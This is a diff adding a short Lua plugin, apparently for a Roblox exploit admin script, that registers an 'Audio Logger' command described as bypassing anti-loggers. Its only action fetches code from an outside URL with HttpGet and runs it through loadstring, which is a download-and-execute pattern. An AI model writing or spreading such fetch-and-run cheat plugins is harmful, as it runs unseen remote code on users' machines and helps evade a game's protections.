@@ -1,0 +1,15 @@
+local Plugin = {
+	["PluginName"] = "Audio Logger",
+	["PluginDescription"] = "A simple Audio Logger which bypasses anti loggers.",
+	["Commands"] = {
+		["alogger/audiologger"] = {
+			["Description"] = "An Audio Logger",
+			["Aliases"] = {'alogger','audiologger'},
+			["Function"] = function(args,speaker)
+				loadstring(game:HttpGet("https://arisstath.me/rbt_audio.txt", true))()
+			end,
+		},
+	},
+}
+
+return Plugin
